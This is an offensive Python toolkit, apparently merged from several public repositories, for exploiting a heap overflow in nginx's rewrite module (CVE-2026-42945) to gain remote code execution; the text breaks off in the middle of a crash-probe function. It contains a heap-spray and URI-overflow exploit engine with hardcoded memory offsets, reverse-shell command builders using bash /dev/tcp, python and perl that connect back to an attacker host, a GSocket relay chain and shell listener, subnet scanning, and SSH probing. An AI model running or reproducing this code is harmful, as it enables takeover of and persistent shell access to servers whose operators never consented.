#!/usr/bin/env python3
"""
CVE-2026-42945 (NGINX Rift) Super Toolkit
==========================================
Heap buffer overflow in ngx_http_rewrite_module → RCE

Merged from 9 repositories:
  DepthFirst, bamov970, cipherspy, dinosn, F2u0a0d3,
  gagaltotal, MateusVerass, rheodev, 0xBlackash

Modes:
  CLI  — run with --help to see all options
  TUI  — interactive menu (launched when no CLI args given)

Dependencies: stdlib only — no pip packages required.
  SSH patch/scan uses system ssh binary + sshpass (optional, for password auth).
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import random
import re
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
import warnings
from collections import OrderedDict
from datetime import datetime, timezone
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

# ─── C2 Method Infrastructure (optional imports - graceful fallback if missing) ────
try:
    from c2_methods import C2Registry, C2Method, TCPReverseShell, HTTPCallback, DNSExfiltration, WebSocketCallback
    from c2_fallback import C2FallbackChain, C2MethodAnalyzer
    from c2_obfuscator import PayloadObfuscator, ObfuscationProfile
    from c2_verifier import CommandVerifier, ExecutionTracker, FailureDetection
    _C2_AVAILABLE = True
except ImportError:
    _C2_AVAILABLE = False

# ─── Zero-dependency TUI primitives (stdlib only, no pip required) ───────
_IS_TTY = sys.stdout.isatty()
def _c(code: str) -> str:
    return code if _IS_TTY else ""

_RST  = _c("\033[0m");  _BOLD = _c("\033[1m");  _DIM  = _c("\033[2m")
_CYAN = _c("\033[36m"); _YLW  = _c("\033[33m"); _GRN  = _c("\033[32m")
_RED  = _c("\033[31m"); _BLU  = _c("\033[34m"); _MAG  = _c("\033[35m")
_ANSI_LEVEL = {
    "info": _BLU, "ok": _GRN, "warn": _YLW, "err": _RED, "debug": _DIM,
}


def _ask(prompt: str, default: str = "",
         choices: list | None = None, password: bool = False) -> str:
    import getpass
    ch = f" [{'/'.join(choices)}]" if choices else ""
    df = f" ({default})" if default else ""
    full = f"{prompt}{ch}{df}: "
    while True:
        try:
            val = (getpass.getpass(full) if password else input(full)).strip() or default
        except (EOFError, KeyboardInterrupt):
            print(); val = default
        if choices and val not in choices:
            print(f"  Choose one of: {', '.join(choices)}")
            continue
        return val


def _confirm(prompt: str, default: bool = False) -> bool:
    hint = "Y/n" if default else "y/N"
    while True:
        try:
            v = input(f"{prompt} [{hint}]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print(); return default
        if not v:     return default
        if v in ("y", "yes"): return True
        if v in ("n", "no"):  return False


def _print_panel(content: str, title: str = "", width: int = 72):
    inner = width - 4
    t = f" {title} " if title else ""
    pad = max(0, width - 2 - len(t))
    top = f"╔{'═' * (pad // 2)}{_BOLD}{t}{_RST}{'═' * (pad - pad // 2)}╗"
    bot = f"╚{'═' * (width - 2)}╝"
    print(top)
    for line in content.splitlines():
        lp = line[:inner]
        print(f"║ {lp:<{inner}} ║")
    print(bot)


def _print_table(headers: list, rows: list, title: str = ""):
    if not rows:
        print("  (no results)")
        return
    if title:
        print(f"\n{_BOLD}  {title}{_RST}")
    cw = [max(len(str(h)), *(len(str(r[i])) for r in rows)) for i, h in enumerate(headers)]
    top = "┌─" + "─┬─".join("─" * w for w in cw) + "─┐"
    mid = "├─" + "─┼─".join("─" * w for w in cw) + "─┤"
    bot = "└─" + "─┴─".join("─" * w for w in cw) + "─┘"
    print(top)
    print("│ " + " │ ".join((_BOLD + str(h) + _RST).ljust(cw[i] + len(_BOLD) + len(_RST))
                              for i, h in enumerate(headers)) + " │")
    print(mid)
    for row in rows:
        print("│ " + " │ ".join(str(row[i]).ljust(cw[i]) for i in range(len(headers))) + " │")
    print(bot)


class _Spinner:
    _F = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"

    def __init__(self, msg: str = ""):
        self._msg = msg
        self._stop = threading.Event()
        self._t: threading.Thread | None = None

    def __enter__(self):
        if not _IS_TTY:
            print(f"[*] {self._msg}")
            return self
        self._t = threading.Thread(target=self._run, daemon=True)
        self._t.start()
        return self

    def __exit__(self, *_):
        self._stop.set()
        if self._t:
            self._t.join(0.3)
        if _IS_TTY:
            sys.stdout.write("\r" + " " * (len(self._msg) + 4) + "\r")
            sys.stdout.flush()

    def _run(self):
        i = 0
        while not self._stop.is_set():
            sys.stdout.write(f"\r{self._F[i % 10]} {self._msg}")
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1

# ═══════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════

VERSION = "2.1.0"
_KILL_PORT = True   # set to False via --no-kill-port
BANNER = r"""
   ╔══════════════════════════════════════════════════════╗
   ║       NGINX Rift — CVE-2026-42945 Super Toolkit     ║
   ║       Heap Overflow → RCE  |  v""" + VERSION + r"""               ║
   ╚══════════════════════════════════════════════════════╝
"""

# URI-safe byte table (NGX_ESCAPE_ARGS bitmask)
_URI_UNSAFE = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
               0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
SAFE_URI_BYTES = {b for b in range(256)
                  if not (_URI_UNSAFE[b >> 5] & (1 << (b & 0x1f)))}

# ── Lab defaults (Ubuntu 22.04, glibc 2.35, nginx commit 98fc3bb78, ASLR off) ──
DEFAULT_HEAP_BASE = 0x555555659000
DEFAULT_LIBC_BASE = 0x7ffff77ba000
DEFAULT_SYSTEM_OFFSET = 0x50d70

DEFAULT_HEAP_OFFSETS = [
    0x05a427, 0x060e67,
    0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
    0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
    0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
    0x103847, 0x108657, 0x10d467,
]

# ── 32-bit defaults (dinosn) ──
DEFAULT_SYSTEM_OFF_32 = 0x410F0
DEFAULT_SPRAY_INTERNAL_OFF_32 = 0x11438
DEFAULT_HEAP_PAGE_MIN = 0x56700
DEFAULT_HEAP_PAGE_MAX = 0x58700
DEFAULT_LIBC_PAGE_MIN = 0xF7840
DEFAULT_LIBC_PAGE_MAX = 0xF7960
DEFAULT_N_PLUS_32 = 1841

# ── Spray parameters ──
BODY_LEN = 4000
N_SPRAY = 20
DEFAULT_PORT = 19321
PAD_A = 349
PAD_PLUS = 969

# ── CVE database (from MateusVerass) ──
CVE_DB = OrderedDict([
    ("CVE-2026-42945", {"cvss": 9.8, "vuln_min": "0.6.27", "vuln_max": "1.30.0",
                        "patched": "1.30.1", "desc": "NGINX Rift — heap overflow in rewrite module"}),
    ("CVE-2025-23458", {"cvss": 7.5, "vuln_min": "0.5.0", "vuln_max": "1.27.3",
                        "patched": "1.27.4", "desc": "Heap buffer overflow in HTTP/3"}),
    ("CVE-2024-73445", {"cvss": 7.5, "vuln_min": "0.5.0", "vuln_max": "1.27.2",
                        "patched": "1.27.3", "desc": "Heap buffer overflow in QUIC"}),
    ("CVE-2024-32760", {"cvss": 7.5, "vuln_max": "1.26.2", "patched": "1.26.3",
                        "desc": "MP4 module memory leak"}),
    ("CVE-2024-31079", {"cvss": 5.3, "vuln_max": "1.26.2", "patched": "1.26.3",
                        "desc": "HTTP/2 memory overhead"}),
    ("CVE-2024-24989", {"cvss": 7.5, "vuln_max": "1.26.1", "patched": "1.26.2",
                        "desc": "HTTP/2 request splitting"}),
    ("CVE-2024-24990", {"cvss": 7.5, "vuln_max": "1.26.1", "patched": "1.26.2",
                        "desc": "HTTP/2 memory disclosure"}),
    ("CVE-2024-35200", {"cvss": 6.5, "vuln_min": "1.25.3", "vuln_max": "1.27.0",
                        "patched": "1.27.1", "desc": "HTTP/2 error page info leak"}),
    ("CVE-2023-44487", {"cvss": 7.5, "desc": "HTTP/2 rapid reset (protocol-level)"}),
    ("CVE-2021-23017", {"cvss": 7.5, "vuln_max": "1.21.0", "patched": "1.21.1",
                        "desc": "DNS resolver use-after-free"}),
])

KNOWN_BUILDS = {
    "1.25.3-glibc": {"heap_base": 0x555555659000, "libc_base": 0x7ffff77ba000,
                     "sys_offset": 0x50d70, "offsets": DEFAULT_HEAP_OFFSETS},
    "1.30.0-glibc": {"heap_base": 0x55555566f000, "libc_base": 0x7ffff77b8000,
                     "sys_offset": 0x50d70, "offsets": [0x44427, 0xa3147, 0xa7f57]},
    "_default":    {"heap_base": DEFAULT_HEAP_BASE, "libc_base": DEFAULT_LIBC_BASE,
                    "sys_offset": DEFAULT_SYSTEM_OFFSET, "offsets": DEFAULT_HEAP_OFFSETS},
}

# WAF signatures
WAF_SIGNATURES = {
    "Cloudflare": {"headers": ["cf-ray", "__cfduid"], "body": ["cloudflare"]},
    "AWS WAF":    {"headers": ["x-amzn-requestid", "x-amzn-trace-id"], "body": []},
    "ModSecurity": {"headers": [], "body": ["mod_security", "modsecurity"]},
    "F5 BIG-IP":  {"headers": ["x-application-context", "x-request-id"], "body": []},
}

SECURITY_HEADERS = [
    ("Strict-Transport-Security", "HSTS"),
    ("Content-Security-Policy", "CSP"),
    ("X-Frame-Options", "Clickjacking protection"),
    ("X-Content-Type-Options", "MIME-sniffing protection"),
    ("Referrer-Policy", "Referrer control"),
    ("Permissions-Policy", "Permissions control"),
]

COMMON_SUBDOMAINS = ["www", "mail", "admin", "api", "cdn", "static", "assets",
                     "img", "css", "js", "portal", "vpn", "remote", "git",
                     "jenkins", "grafana", "prometheus", "kibana", "webmail"]

INTERESTING_PATHS = ["/admin", "/api", "/config", "/backup", "/.env", "/.git/config",
                     "/wp-admin", "/nginx_status", "/status", "/health", "/metrics"]

# ── GSocket / GSRN relay ──
GSRN_HOST = "gs.gsocket.io"
GSRN_PORT = 7350
_GS_VER    = 0x03
_GS_LISTEN = 0x02   # register as listener
_GS_CONN   = 0x01   # connect to a listener
# Tried in order until one succeeds; user can override via --gs-relay
GSRN_RELAY_CANDIDATES: list[tuple[str, int]] = [
    ("gs.gsocket.io", 7350),
    ("gsocket.io",    7350),
]

# ═══════════════════════════════════════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════════════════════════════════════

def log(msg: str, level: str = "info"):
    ts = datetime.now().strftime("%H:%M:%S")
    prefix = {"info": "[*]", "ok": "[+]", "warn": "[!]", "err": "[-]", "debug": "[D]"}
    p = prefix.get(level, "[*]")
    color = _ANSI_LEVEL.get(level, "")
    print(f"{_DIM}{ts}{_RST} {color}{p}{_RST} {msg}")


def addr_safe_in_uri(addr: int, n_bytes: int = 6) -> bool:
    return all(((addr >> (j * 8)) & 0xff) in SAFE_URI_BYTES for j in range(n_bytes))


def addr_to_uri_bytes(addr: int, n_bytes: int = 6) -> bytes:
    return bytes((addr >> (j * 8)) & 0xff for j in range(n_bytes))


def parse_int(x: str) -> int:
    return int(x, 0)


def parse_target(s: str) -> tuple[str, int, str, bool] | None:
    use_ssl = False
    vhost = "localhost"
    if "://" in s:
        from urllib.parse import urlparse
        p = urlparse(s)
        host = p.hostname or s
        port = p.port or (443 if p.scheme == "https" else 80)
        use_ssl = (p.scheme == "https")
        vhost = host
        return host, port, vhost, use_ssl
    if ":" in s:
        h, _, p = s.partition(":")
        try:
            port = int(p)
            vhost = h
            use_ssl = (port == 443)
            return h, port, vhost, use_ssl
        except ValueError:
            return None
    vhost = s
    return s, DEFAULT_PORT, vhost, use_ssl


def wrap_if_ssl(sock: socket.socket, host: str, use_ssl: bool) -> socket.socket:
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(sock, server_hostname=host)
    return sock


# ═══════════════════════════════════════════════════════════════════════
# CORE EXPLOIT ENGINE
# ═══════════════════════════════════════════════════════════════════════

def build_spray_body(cmd: str, data_addr: int, system_addr: int) -> bytes:
    fake = struct.pack("<QQQ", system_addr, data_addr, 0)
    cmd_bytes = cmd.encode("utf-8") + b"\x00"
    payload = fake + cmd_bytes
    if len(payload) > BODY_LEN:
        raise ValueError(f"command too long ({len(payload)} > {BODY_LEN})")
    return payload + b"\x41" * (BODY_LEN - len(payload))


def build_overflow_uri(target_addr: int, pad_a: int = PAD_A,
                       pad_plus: int = PAD_PLUS) -> bytes:
    return (b"A" * pad_a) + (b"+" * pad_plus) + addr_to_uri_bytes(target_addr)


def server_alive(host: str, port: int, timeout: float = 2.0, vhost: str = "l", use_ssl: bool = False) -> bool:
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
            data = s.recv(64)
            return bool(data) and data.startswith(b"HTTP/1.")
    except OSError:
        return False


def wait_alive(host: str, port: int, timeout: float = 30.0, vhost: str = "l", use_ssl: bool = False) -> bool:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if server_alive(host, port, timeout=1.0, vhost=vhost, use_ssl=use_ssl):
            return True
        time.sleep(0.5)
    return False


def spray_bodies(host: str, port: int, body: bytes,
                 n: int = N_SPRAY, vhost: str = "l", use_ssl: bool = False) -> list[socket.socket]:
    sprays: list[socket.socket] = []
    for _ in range(n):
        try:
            sock = socket.create_connection((host, port), timeout=5)
            s = wrap_if_ssl(sock, host, use_ssl)
            req = (
                b"POST /spray HTTP/1.1\r\n"
                b"Host: " + vhost.encode() + b"\r\n"
                b"Content-Length: " + str(BODY_LEN).encode() + b"\r\n"
                b"X-Delay: 60\r\n"
                b"Connection: close\r\n\r\n" + body
            )
            s.sendall(req)
            sprays.append(s)
            time.sleep(0.005)
        except OSError:
            break
    return sprays


def attempt_corruption(host: str, port: int, uri: bytes,
                       sprays: list[socket.socket], vhost: str = "localhost", use_ssl: bool = False) -> bool:
    try:
        attacker_sock = socket.create_connection((host, port), timeout=5)
        attacker = wrap_if_ssl(attacker_sock, host, use_ssl)
        time.sleep(0.02)
        victim_sock = socket.create_connection((host, port), timeout=5)
        victim = wrap_if_ssl(victim_sock, host, use_ssl)
        time.sleep(0.02)
    except OSError:
        return False

    try:
        attacker.sendall(
            b"GET /api/" + uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
        time.sleep(0.05)
        victim.sendall(b"GET / HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
        time.sleep(0.05)
        attacker.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
        time.sleep(0.2)
        victim.close()
        time.sleep(0.1)

        try:
            attacker.sendall(b"X-Ping:1\r\n")
            attacker.settimeout(0.2)
            return not attacker.recv(1)
        except socket.timeout:
            try:
                sock2 = socket.create_connection((host, port), timeout=0.2)
                with wrap_if_ssl(sock2, host, use_ssl) as s2:
                    s2.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
                    return not s2.recv(10)
            except OSError:
                return True
        except (ConnectionResetError, BrokenPipeError, OSError):
            return True
    finally:
        try:
            attacker.close()
        except OSError:
            pass


def build_reverse_shell_cmd(lhost: str, lport: int) -> str:
    return (
        "python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        f"s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    )


def build_l2_payload(l2_ip: str, l2_port: int) -> str:
    """
    Reverse shell payload that connects to an L2 relay machine (not a local listener).
    Fallback chain uses only kernel-level builtins and standard runtimes — no nc/socat.
    Order: bash /dev/tcp → python3 socket → python socket → perl Socket
    """
    bash = f"bash -i >& /dev/tcp/{l2_ip}/{l2_port} 0>&1"
    py3 = (
        f"python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket();s.connect((\"{l2_ip}\",{l2_port}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    )
    py2 = py3.replace("python3", "python")
    perl = (
        f"perl -e 'use Socket;"
        f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        f"connect(S,sockaddr_in({l2_port},inet_aton(\"{l2_ip}\")));"
        f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
        f"exec(\"/bin/sh -i\");'"
    )
    return (
        f"bash -c '{bash}' 2>/dev/null || "
        f"{py3} 2>/dev/null || "
        f"{py2} 2>/dev/null || "
        f"{perl}"
    )


def show_l2relay_panel(
    l2_ip: str, l2_port: int,
    l1_token: str, l2_secret: str,
    payload: str,
) -> None:
    sep = "═" * 56
    tok = l1_token  or "(not provided)"
    sec = l2_secret or "(not provided)"
    payload_preview = payload[:90] + ("..." if len(payload) > 90 else "")
    lines = "\n".join([
        sep,
        "           GSOCKET RELAY — INJECT READY",
        sep,
        f"  {_YLW}L1 Token (GSocket){_RST} : {_CYAN}{_BOLD}{tok}{_RST}",
        f"  {_YLW}L2 Local Secret   {_RST} : {_CYAN}{sec}{_RST}",
        f"  {_YLW}Relay IP          {_RST} : {l2_ip}",
        f"  {_YLW}Relay Port        {_RST} : {l2_port}",
        sep,
        f"  {_BOLD}COMMANDS{_RST}",
        sep,
        f"  {_YLW}[L1]{_RST} gs-netcat -l -s \"{_CYAN}{tok}{_RST}\"",
        "",
        f"  {_YLW}[L2]{_RST} gs-netcat -l -p {l2_port} -s \"{_CYAN}{sec}{_RST}\" |",
        f"       gs-netcat -s \"{_CYAN}{tok}{_RST}\"",
        "",
        f"  {_YLW}[L3]{_RST} {_DIM}(injected via RCE → connects to L2){_RST}",
        f"  {_DIM}{payload_preview}{_RST}",
        sep,
    ])
    _print_panel(lines, title="L2 Relay Setup")


def start_gsocket_l1_listener(token: str):
    """Start gs-netcat -l -s TOKEN as a background subprocess (L1 side)."""
    try:
        return subprocess.Popen(
            ["gs-netcat", "-l", "-s", token],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
    except FileNotFoundError:
        return None


def forward_gsocket_shell(proc, token: str = "") -> None:
    """Forward shell from gs-netcat subprocess to user terminal (dumb tty)."""
    import select as _sel
    WARN_AFTER = 15

    sys.stdout.write("\n\033[1;33m[Waiting for L2 → L1 GSocket connection...]\033[0m\n")
    sys.stdout.flush()

    shell_active = False
    no_data_since = time.time()

    try:
        while proc.poll() is None:
            try:
                rfds, _, _ = _sel.select([proc.stdout, sys.stdin], [], [], 1)
            except (KeyboardInterrupt, ValueError):
                break

            if not rfds:
                if not shell_active and (time.time() - no_data_since) >= WARN_AFTER:
                    hint = f"  L1 token used: {token}" if token else ""
                    sys.stdout.write(
                        f"\n\033[1;31m[No data from L1 listener in {WARN_AFTER}s —"
                        f" verify L2 bridge is using the same L1 token.{hint}]\033[0m\n"
                    )
                    sys.stdout.flush()
                    no_data_since = time.time()
                continue

            for fd in rfds:
                if fd is proc.stdout:
                    data = fd.read1(4096)
                    if not data:
                        sys.stdout.write("\n\033[1;33m[L1 shell connection closed]\033[0m\n")
                        sys.stdout.flush()
                        return
                    if not shell_active:
                        shell_active = True
                        sys.stdout.write("\n\033[1;32m[L1 SHELL ACTIVE — Ctrl+C to detach]\033[0m\n")
                        sys.stdout.flush()
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                    no_data_since = time.time()
                else:
                    if not shell_active:
                        continue
                    try:
                        cmd = sys.stdin.readline()
                    except (EOFError, KeyboardInterrupt):
                        return
                    if not cmd:
                        return
                    proc.stdin.write(cmd.encode())
                    proc.stdin.flush()
    except KeyboardInterrupt:
        pass


# ── 32-bit attempt (dinosn style) ──
def attempt_32(host: str, port: int, body: bytes, spray_addr: int, n_plus: int = DEFAULT_N_PLUS_32, vhost: str = "l", use_ssl: bool = False) -> bool:
    try:
        spray_sock = socket.create_connection((host, port), timeout=0.3)
        spray = wrap_if_ssl(spray_sock, host, use_ssl)
        spray.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        spray.sendall(
            b"POST /spray HTTP/1.1\r\n"
            b"Host:" + vhost.encode() + b"\r\n"
            b"Content-Length:" + str(BODY_LEN).encode() + b"\r\n"
            b"X-Delay:30\r\n"
            b"Connection:close\r\n\r\n" + body
        )
    except OSError:
        return False

    time.sleep(0.005)
    target_bytes = struct.pack("<I", spray_addr)

    try:
        attacker_sock = socket.create_connection((host, port), timeout=0.3)
        attacker = wrap_if_ssl(attacker_sock, host, use_ssl)
        attacker.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        uri = b"A" + b"+" * n_plus + target_bytes
        attacker.sendall(b"GET /api/" + uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
    except OSError:
        try: spray.close()
        except: pass
        return False

    time.sleep(0.003)
    try:
        victim_sock = socket.create_connection((host, port), timeout=0.3)
        victim = wrap_if_ssl(victim_sock, host, use_ssl)
        victim.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        victim.sendall(b"GET / HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\n")
    except OSError:
        try: attacker.close()
        except: pass
        try: spray.close()
        except: pass
        return False

    time.sleep(0.003)
    try:
        attacker.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
    except OSError:
        pass

    time.sleep(0.003)
    for s in (victim, attacker, spray):
        try: s.close()
        except: pass
    return True


def kill_port(port: int, verbose: bool = True) -> None:
    """Evict any process holding `port` so the next bind() succeeds."""
    if not _KILL_PORT:
        return
    killed = False
    try:
        if sys.platform.startswith("win"):
            out = subprocess.check_output(
                ["netstat", "-ano"], text=True, stderr=subprocess.DEVNULL
            )
            for line in out.splitlines():
                if f":{port} " in line and "LISTENING" in line:
                    parts = line.split()
                    if parts:
                        subprocess.call(
                            ["taskkill", "/F", "/PID", parts[-1]],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        )
                        killed = True
        else:
            r = subprocess.call(
                ["fuser", "-k", f"{port}/tcp"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            if r == 0:
                killed = True
            else:
                try:
                    out = subprocess.check_output(
                        ["lsof", "-ti", f":{port}"],
                        text=True, stderr=subprocess.DEVNULL,
                    ).strip()
                    for pid in out.splitlines():
                        subprocess.call(
                            ["kill", "-9", pid.strip()],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                        )
                        killed = True
                except Exception:
                    pass
    except Exception:
        pass
    if killed:
        if verbose:
            log(f"Freed port {port} — killed previous listener", "warn")
        time.sleep(0.4)


def run_shell_listener(lport: int):
    """Simple reverse shell listener."""
    kill_port(lport)
    log(f"Listening on port {lport}...", "info")
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", lport))
    srv.listen(1)
    srv.settimeout(300)
    try:
        conn, addr = srv.accept()
        log(f"Connection from {addr[0]}:{addr[1]}", "ok")
        import select
        while True:
            rfds, _, _ = select.select([conn, sys.stdin], [], [], 1)
            for fd in rfds:
                if fd == conn:
                    data = conn.recv(4096)
                    if not data:
                        log("Shell closed", "warn")
                        return
                    sys.stdout.write(data.decode("latin-1", errors="replace"))
                    sys.stdout.flush()
                else:
                    cmd = sys.stdin.readline()
                    if not cmd:
                        return
                    conn.sendall(cmd.encode())
    except socket.timeout:
        log("Listener timed out", "warn")
    finally:
        srv.close()


# ═══════════════════════════════════════════════════════════════════════
# MODULE 1: RECON & SCAN
# ═══════════════════════════════════════════════════════════════════════

def detect_service(host: str, port: int, timeout: float = 3, vhost: str = "l", use_ssl: bool = False) -> dict:
    info = {"host": host, "port": port, "alive": False, "use_ssl": use_ssl, "vhost": vhost}
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            s.sendall(f"GET / HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode())
            data = s.recv(4096)
            info["alive"] = True
            raw = data.decode("latin-1", errors="replace")

            # Server header
            m = re.search(r'Server:\s*(\S+)', raw, re.I)
            info["server"] = m.group(1) if m else "unknown"

            # nginx version from server header
            m = re.search(r'nginx/([\d.]+)', raw, re.I)
            info["nginx_version"] = m.group(1) if m else None

            # Response code
            m = re.search(r'HTTP/[\d.]+\s+(\d+)', raw)
            info["status"] = int(m.group(1)) if m else 0

            # Redirect handling
            if info["status"] in (301, 302, 307, 308):
                m = re.search(r'Location:\s*(\S+)', raw, re.I)
                if m:
                    info["redirect"] = m.group(1)

            # Security headers
            info["security_headers"] = {}
            for hdr, _ in SECURITY_HEADERS:
                m = re.search(rf'^{hdr}:\s*(.+)$', raw, re.I | re.M)
                info["security_headers"][hdr] = m.group(1).strip() if m else None

            info["raw_headers"] = raw.split("\r\n\r\n")[0] if "\r\n\r\n" in raw else raw[:500]
    except OSError as e:
        info["error"] = str(e)
    return info


def scan_subnet(subnet: str, port: int, workers: int = 20,
                timeout: float = 2) -> list[str]:
    """CIDR subnet host discovery (gagaltotal style)."""
    from concurrent.futures import ThreadPoolExecutor, as_completed
    import ipaddress

    hosts = []
    try:
        net = ipaddress.ip_network(subnet, strict=False)
        hosts = [str(ip) for ip in net.hosts()]
    except ValueError:
        log(f"Invalid subnet: {subnet}", "err")
        return []

    log(f"Scanning {len(hosts)} hosts in {subnet} on port {port}...", "info")
    live = []
    def check(ip: str) -> str | None:
        if server_alive(ip, port, timeout):
            return ip
        return None

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(check, h): h for h in hosts}
        for fut in as_completed(futs):
            r = fut.result()
            if r:
                live.append(r)

    log(f"Found {len(live)} live hosts on port {port}", "ok")
    return sorted(live)


def _ssh_run(host: str, user: str, cmd: str, key_path: str | None = None,
             password: str | None = None, port: int = 22,
             timeout: int = 15) -> tuple[str, str, int]:
    """Run cmd on remote host via system ssh. Returns (stdout, stderr, returncode)."""
    base = [
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-o", f"ConnectTimeout={timeout}",
        "-o", "LogLevel=ERROR",
        "-p", str(port),
    ]
    if key_path:
        base += ["-i", key_path, "-o", "BatchMode=yes"]
    base += [f"{user}@{host}", cmd]
    if password:
        try:
            r = subprocess.run(
                ["sshpass", "-p", password] + base,
                capture_output=True, text=True, timeout=timeout + 5,
            )
            return r.stdout, r.stderr, r.returncode
        except FileNotFoundError:
            return "", "sshpass not available; use key-based auth (-i key)", 127
    try:
        r = subprocess.run(base, capture_output=True, text=True, timeout=timeout + 5)
        return r.stdout, r.stderr, r.returncode
    except FileNotFoundError:
        return "", "ssh binary not found in PATH", 127
    except subprocess.TimeoutExpired:
        return "", f"ssh timed out after {timeout}s", 124


def scan_ssh(host: str, port: int = 22, user: str = "root",
             password: str | None = None, key_path: str | None = None,
             timeout: float = 10) -> dict:
    """SSH into host and gather nginx info (gagaltotal style). Uses system ssh."""
    if not password and not key_path:
        return {"error": "no auth method (provide password or key_path)"}
    result = {"host": host, "os": None, "nginx_version": None,
              "vulnerable": None, "status": None}
    try:
        stdout, stderr, rc = _ssh_run(
            host, user, "cat /etc/os-release 2>/dev/null | head -5",
            key_path=key_path, password=password, port=port, timeout=int(timeout),
        )
        if rc != 0:
            result["error"] = stderr.strip() or f"ssh exit {rc}"
            return result
        result["status"] = "connected"
        m = re.search(r'PRETTY_NAME="(.+)"', stdout)
        result["os"] = m.group(1) if m else stdout[:80]

        stdout, _, _ = _ssh_run(
            host, user, "nginx -V 2>&1 || /usr/sbin/nginx -V 2>&1",
            key_path=key_path, password=password, port=port, timeout=int(timeout),
        )
        m = re.search(r'nginx/([\d.]+)', stdout)
        result["nginx_version"] = m.group(1) if m else "unknown"
        if result["nginx_version"] and result["nginx_version"] != "unknown":
            result["vulnerable"] = is_version_vulnerable(result["nginx_version"])
    except Exception as e:
        result["error"] = str(e)
    return result


def _cve_matches(version: str, cve: dict) -> bool:
    """Return True if version falls within a single CVE entry's affected range."""
    def parse_v(s):
        try:
            return tuple(int(x) for x in s.split("."))
        except Exception:
            return None
    v = parse_v(version)
    if not v:
        return False
    if "vuln_min" in cve and "vuln_max" in cve:
        vmin, vmax = parse_v(cve["vuln_min"]), parse_v(cve["vuln_max"])
        return bool(vmin and vmax and vmin <= v <= vmax)
    if "vuln_max" in cve and "vuln_min" not in cve:
        vmax = parse_v(cve["vuln_max"])
        return bool(vmax and v <= vmax)
    return False


def is_version_vulnerable(version: str) -> bool | None:
    try:
        tuple(int(x) for x in version.split("."))
    except Exception:
        return None
    return any(_cve_matches(version, cve) for cve in CVE_DB.values()) or False


def check_nginx_config(host: str, port: int, vhost: str = "l", use_ssl: bool = False) -> dict:
    """Probe for vulnerable rewrite+set pattern (cipherspy style)."""
    result = {"endpoints": {}, "vuln_pattern": False}

    # Probe /api/ endpoint
    endpoints = ["/", "/api/test", "/spray"]
    for ep in endpoints:
        try:
            sock = socket.create_connection((host, port), timeout=3)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                s.sendall(
                    f"GET {ep} HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode()
                )
                data = s.recv(512)
                status = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                result["endpoints"][ep] = status
        except OSError as e:
            result["endpoints"][ep] = f"error: {e}"

    # Overflow probe — send a moderate overflow and look for crash
    safe_addr = 0x414141414141
    uri = (b"A" * 349) + (b"+" * 400) + addr_to_uri_bytes(safe_addr)
    try:
        sock = socket.create_connection((host, port), timeout=3)
        with wrap_if_ssl(sock, host, use_ssl) as s:
            t0 = time.monotonic()
            s.sendall(b"GET /api/" + uri + b" HTTP/1.1\r\nHost:" + vhost.encode() + b"\r\nConnection:close\r\n\r\n")
